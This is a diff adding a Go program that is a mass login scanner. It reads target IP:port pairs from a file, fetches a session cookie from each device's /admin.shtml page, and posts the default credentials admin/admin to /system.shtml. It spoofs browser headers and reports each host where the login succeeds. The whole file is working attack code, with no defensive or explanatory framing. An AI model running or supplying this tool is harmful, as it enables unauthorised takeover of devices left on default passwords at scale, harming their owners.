@@ -1,0 +1,130 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+)
+
+func main() {
+	ipsFile := "ips.txt"
+	username := "admin"
+	password := "admin"
+
+	ipList, err := readLines(ipsFile)
+	if err != nil {
+		fmt.Println("Error reading IP list:", err)
+		return
+	}
+
+	var wg sync.WaitGroup
+	concurrency := 5 // Set the number of concurrent requests
+
+	// Create a channel to limit concurrency
+	semaphore := make(chan struct{}, concurrency)
+
+	for _, ipPort := range ipList {
+		wg.Add(1)
+		semaphore <- struct{}{} // Acquire a semaphore slot
+
+		go func(ipPort string) {
+			defer func() {
+				<-semaphore // Release the semaphore slot
+				wg.Done()
+			}()
+
+			client := &http.Client{}
+
+			getURL := fmt.Sprintf("http://%s/admin.shtml", ipPort)
+			postURL := fmt.Sprintf("http://%s/system.shtml", ipPort)
+
+			// Perform GET request to retrieve PHPSESSID cookie
+			getReq, err := http.NewRequest("GET", getURL, nil)
+			if err != nil {
+				fmt.Println("Error creating GET request:", err)
+				return
+			}
+
+			getResp, err := client.Do(getReq)
+			if err != nil {
+				fmt.Println("Error sending GET request:", err)
+				return
+			}
+			defer getResp.Body.Close()
+
+			var phpsessid string
+			cookies := getResp.Cookies()
+			for _, cookie := range cookies {
+				if cookie.Name == "PHPSESSID" {
+					phpsessid = cookie.Value
+					break
+				}
+			}
+
+			// Perform POST request with the retrieved PHPSESSID cookie
+			postData := fmt.Sprintf("login=login&username=%s&password=%s", username, password)
+			postReq, err := http.NewRequest("POST", postURL, strings.NewReader(postData))
+			if err != nil {
+				fmt.Println("Error creating POST request:", err)
+				return
+			}
+
+		postReq.Header.Set("Cache-Control", "max-age=0")
+		postReq.Header.Set("Upgrade-Insecure-Requests", "1")
+		postReq.Header.Set("Origin", fmt.Sprintf("http://%s", ipPort))
+		postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		postReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
+		postReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		postReq.Header.Set("Referer", fmt.Sprintf("http://%s/admin.shtml", ipPort))
+		postReq.Header.Set("Accept-Encoding", "gzip, deflate")
+		postReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		postReq.Header.Set("Cookie", "PHPSESSID="+phpsessid)
+		postReq.Header.Set("Connection", "close")
+
+		// Calculate Content-Length header
+		postReq.Header.Set("Content-Length", fmt.Sprintf("%d", len(postData)))
+
+			postResp, err := client.Do(postReq)
+			if err != nil {
+				fmt.Println("Error sending POST request:", err)
+				return
+			}
+			defer postResp.Body.Close()
+
+			postRespBody, err := ioutil.ReadAll(postResp.Body)
+			if err != nil {
+				fmt.Println("Error reading POST response body:", err)
+				return
+			}
+
+			if strings.Contains(string(postRespBody), "PoLRE") {
+				fmt.Printf("[SUCCESS] successfully logged in for %s\n", ipPort)
+			}
+		}(ipPort)
+	}
+
+	wg.Wait()
+	close(semaphore)
+}
+
+func readLines(filename string) ([]string, error) {
+	file, err := os.Open(filename)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+	return lines, nil
+}
